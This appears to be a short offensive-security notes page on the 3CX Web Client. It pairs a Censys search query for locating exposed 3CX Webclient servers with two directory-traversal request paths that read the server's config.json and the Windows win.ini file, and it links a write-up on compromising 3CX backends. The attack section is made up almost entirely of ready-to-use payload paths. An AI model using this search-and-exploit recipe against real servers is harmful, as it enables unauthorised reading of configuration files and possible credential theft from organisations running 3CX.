---
description: >-
  The 3CX Web Client is a browser-based app. It combines all the features you
  need to easily and efficiently communicate, collaborate and connect with
  colleagues, partners, and customers.
---

# 3CX Webclient

## Search

```
https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=INCLUDE&q=services.http.response.html_title%3A%223CX+Webclient%22
```

## Exploit

### Directory Traversal

```
{{BaseURL}}/Electron/download/windows/..\..\..\Http\webroot\config.json
{{BaseURL}}/Electron/download/windows/\windows\win.ini
```

{% embed url="https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88" %}
